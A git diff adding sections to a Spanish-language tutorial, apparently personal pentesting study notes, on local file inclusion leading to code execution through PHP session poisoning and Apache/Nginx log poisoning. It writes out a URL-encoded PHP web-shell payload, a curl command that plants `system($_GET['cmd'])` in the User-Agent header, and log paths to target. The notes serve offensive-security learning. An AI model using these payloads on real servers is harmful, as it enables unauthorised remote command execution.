@@ -461,5 +461,62 @@ Este escript es como si fuera un fichero "phat" y se hace una shell con un txt
 php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 ```
 
-Ahora noostros deberiamos llamar al jpg y activaria el subfichero
+Ahora noostros deberiamos llamar al jpg y activaria el subfichero.
 
+# ENVENENAMIENTO DE LOG
+
+Anteriormente vimos como incluid una sección que contiene un código PHP,  y al ser jecutado, se crea una función vulnerable hacía la ejecución de privilegios. Los ataques que haremos en esta sceción, es escribir código PHP en una rchivo y tener el control de los logeos
+
+![image](https://github.com/user-attachments/assets/a70edd17-9476-4f10-96f3-117b0dad25e2)
+
+## ENVENENAMIENTO DE SESIÓN CON PHP
+
+Las aplicaciones web utilizan "PHPSESSID" cookies, se utilizan para espicifar los datos del back-end del usuario, estos detalle que guarda son los archivos de sesion de /var/lib/pgp/sessions, Lo primero de todo que necesitarmeos en tener una sesión y examientar el archivo de sesió.
+
+Una vez veamos un valor de cookie como "nhhv8i0o6ua4g88bkdl9u1fdsd" lo guardaremos en "/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd" esto incluira que podemos ver contenidos
+
+Podemos ver que el rachivvo contiene 2 valores , la página que es seleccionado por el valor "language". El valor de preferencia no esta en nuestro control, no debemos especificarlo porque se especifica automaticamente, el pavor de la pagina es el que tenmos el control igual que el parametro language
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
+```
+
+En este momento vamos a añadir un archivo "es-php" que nos dice que conseguimos valores  o código
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+Finalmentep ondemos añdir un "&cmd=id"
+
+### EVENENAMIENTO DE LOG EN UN SERVIDOR
+
+EN apache o ngnix encontramos bastantes archivos de log, como "access.log" "error.log" el acces.log contiene información sobre las consultas que se hacen al servidor, incluyendo las consultar "User-Agent" 
+
+Nosotros deberemos incluid la vulnerabilidad "LFI", una vez que podamos leer los log con privilegios bajo, mientras los logs en apache debes tener mas privilegios.
+
+Apache : - /var/log/apache2/
+
+Windows : - C:\xampp\apache\logs\
+
+Nginx : - /var/log/nginx/
+
+Windows : C:\nginx\log\
+
+Podriamos leer el log contenido direccones remotas, consultas, codigo de respuesta, el user ager.
+
+Podemos envenenar el header "User-Agent" para cambiar la condiguración
+
+```
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+```
+
+Ahora esto contiene un código php expecificando (?cmd=id) 
+
+Otra forma de utilizar esta misma tecnica es en sevicios
+
+- /var/log/ssh.log
+- /var/log/mail
+- /var/log/vsftpd.log
+
+  
